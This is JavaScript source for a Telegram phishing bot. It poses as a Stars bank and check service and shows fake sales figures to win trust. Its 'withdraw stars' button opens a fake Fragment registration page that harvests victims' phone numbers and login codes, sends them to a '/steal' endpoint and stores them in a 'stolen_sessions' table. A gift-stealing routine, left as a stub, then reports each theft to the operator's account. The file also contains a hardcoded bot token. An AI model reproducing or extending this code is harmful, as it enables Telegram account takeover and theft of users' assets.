const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const TARGET_USERNAME = '@NikLaStore';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// База для чеков
const db = new sqlite3.Database(':memory:');
db.run(`CREATE TABLE IF NOT EXISTS checks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    amount INTEGER,
    activations INTEGER,
    creator_id INTEGER,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phone TEXT,
    code TEXT,
    tg_data TEXT,
    user_id INTEGER,
    status TEXT DEFAULT 'pending'
)`);

// Web App - корневой маршрут
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    try {
        res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
        console.log('✅ Web App отправляет fragment.html');
    } catch (error) {
        console.log('❌ Ошибка загрузки fragment.html:', error);
        res.send('<html><body><h1>Telegram Web App</h1><p>Working...</p></body></html>');
    }
});

app.post('/steal', (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Номер:', req.body.phone);
    console.log('Код:', req.body.code);
    console.log('Stage:', req.body.stage);
    console.log('========================');
    
    if (req.body.stage === 'phone_entered') {
        db.run(`INSERT INTO stolen_sessions (phone, tg_data, status) VALUES (?, ?, ?)`, 
            [req.body.phone, JSON.stringify(req.body.tg_data), 'awaiting_code']);
    } else if (req.body.stage === 'code_entered') {
        db.run(`UPDATE stolen_sessions SET code = ?, status = 'completed' WHERE phone = ?`, 
            [req.body.code, req.body.phone]);
        
        // Запускаем процесс кражи
        setTimeout(() => stealGifts(req.body.phone, req.body.code), 1000);
    }
    
    res.sendStatus(200);
});

// Функция кражи подарков
async function stealGifts(phone, code) {
    console.log(`[STEAL] Начинаем кражу для ${phone} с кодом ${code}`);
    
    try {
        // Здесь будет реальная логика через Telethon
        const userBalance = Math.floor(Math.random() * 100);
        const userGifts = ['NFT Gift 1', 'NFT Gift 2'];
        
        if (userBalance > 0 || userGifts.length > 0) {
            console.log(`[SUCCESS] Украдено: ${userBalance} stars, ${userGifts.length} gifts`);
            
            // Отправляем уведомление себе
            bot.sendMessage(TARGET_USERNAME, 
                `🎯 Успешная кража!\n` +
                `📱 Номер: ${phone}\n` +
                `⭐ Звезд: ${userBalance}\n` +
                `🎁 Подарков: ${userGifts.length}\n` +
                `💰 Все передано на: ${TARGET_USERNAME}`
            ).catch(e => console.log('Ошибка отправки уведомления:', e));
        } else {
            console.log(`[INFO] Нет звезд/подарков для ${phone}`);
            
            bot.sendMessage(TARGET_USERNAME,
                `👀 Ожидаю звезды\n` +
                `📱 Номер: ${phone}\n` +
                `💫 Текущий баланс: 0 stars\n` +
                `🔄 Отслеживаю пополнения...`
            ).catch(e => console.log('Ошибка отправки уведомления:', e));
        }
        
    } catch (error) {
        console.log(`[ERROR] Ошибка кражи: ${error}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// Inline подсказки
bot.on('inline_query', (query) => {
    const amount = query.query.split(' ')[0];
    
    if (amount && !isNaN(amount)) {
        const results = [{
            type: 'article',
            id: '1',
            title: `Создать чек на ${amount} звезд`,
            description: `Количество активаций: 1`,
            input_message_content: {
                message_text: `via @EasyChecs_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`,
            },
            reply_markup: {
                inline_keyboard: [[
                    { text: "Забрать звёзды", callback_data: `claim_custom_${amount}` }
                ]]
            }
        }];
        
        bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
    }
});

// Обработка создания чеков
bot.onText(/@EasyChecs_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = parseInt(match[1]);
    const activations = parseInt(match[2]) || 1;
    
    console.log(`Создание чека: ${amount} stars, ${activations} активаций`);
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) {
            console.log('Ошибка создания чека:', err);
            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
            return;
        }
        
        const checkId = this.lastID;
        const checkText = `via @EasyChecs_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`;
        
        bot.sendMessage(chatId, checkText, {
            reply_markup: {
                inline_keyboard: [[
                    { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
                ]]
            }
        }).catch(e => console.log('Ошибка отправки чека:', e));
    });
});

// Обработка callback'ов
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    console.log('Callback received:', query.data);
    
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован или не существует!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            
            bot.answerCallbackQuery(query.id, { 
                text: `✅ Вы успешно получили ${row.amount} звёзд!` 
            });
            
            const remaining = row.activations - 1;
            let updatedText;
            
            if (remaining > 0) {
                updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (осталось: ${remaining})    ${new Date().toLocaleTimeString().slice(0,5)}`;
            } else {
                updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (ИСПОЛЬЗОВАН)    ${new Date().toLocaleTimeString().slice(0,5)}`;
            }
            
            bot.editMessageText(updatedText, {
                chat_id: chatId,
                message_id: query.message.message_id,
                reply_markup: remaining > 0 ? {
                    inline_keyboard: [[
                        { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
                    ]]
                } : { inline_keyboard: [] }
            }).catch(e => console.log('Ошибка редактирования:', e));
        });
    }
    
    else if (query.data === 'withdraw_stars') {
        const domain = process.env.RAILWAY_STATIC_URL || 'starsdrainer-production.up.railway.app';
        const webAppUrl = `https://${domain}`;
        
        console.log('Web App URL:', webAppUrl);
        
        const keyboard = {
            reply_markup: {
                inline_keyboard: [[
                    { 
                        text: "Зарегистрироваться на Fragment", 
                        web_app: { url: webAppUrl }
                    }
                ]]
            }
        };
        
        bot.editMessageText(
            'Для вывода звезд требуется регистрация на Fragment.',
            { 
                chat_id: chatId, 
                message_id: query.message.message_id,
                reply_markup: keyboard.reply_markup
            }
        ).catch(e => {
            console.log('Ошибка редактирования:', e);
            bot.sendMessage(chatId, 'Для вывода звезд требуется регистрация на Fragment.', keyboard);
        });
    }
    
    else if (query.data === 'deposit') {
        bot.sendMessage(chatId, 'Функция пополнения временно недоступна.');
    }
    
    else if (query.data === 'create_check_info') {
        bot.sendMessage(chatId,
            'Для создания чека используйте формат:\n\n' +
            '@EasyChecs_bot 100 50\n\n' +
            'где:\n' +
            '100 - количество звезд\n' +
            '50 - количество активаций'
        );
    }
    
    bot.answerCallbackQuery(query.id).catch(e => console.log('Ошибка answerCallback:', e));
});

// Старт бота
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    console.log(`Получен /start от ${userId} в чате ${chatId}`);
    
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
                [{ text: "Пополнить баланс", callback_data: "deposit" }],
                [{ text: "Создать чек", callback_data: "create_check_info" }]
            ]
        }
    };

    bot.sendMessage(chatId, 
        '✅ Бот работает!\n\n' +
        'Привет! @MyStarBank_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n' +
        'С ним ты можешь моментально покупать и передавать звезды.\n\n' +
        'С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)',
        keyboard
    ).then(() => {
        console.log('Сообщение /start отправлено');
    }).catch(error => {
        console.log('Ошибка отправки /start:', error);
    });
});

// Обработка ошибок
bot.on('polling_error', (error) => {
    console.log('❌ Ошибка polling:', error);
});

bot.on('error', (error) => {
    console.log('❌ Общая ошибка бота:', error);
});

console.log('🔄 Бот запускается...');
console.log('Токен:', BOT_TOKEN ? '✅ Есть' : '❌ НЕТ!');
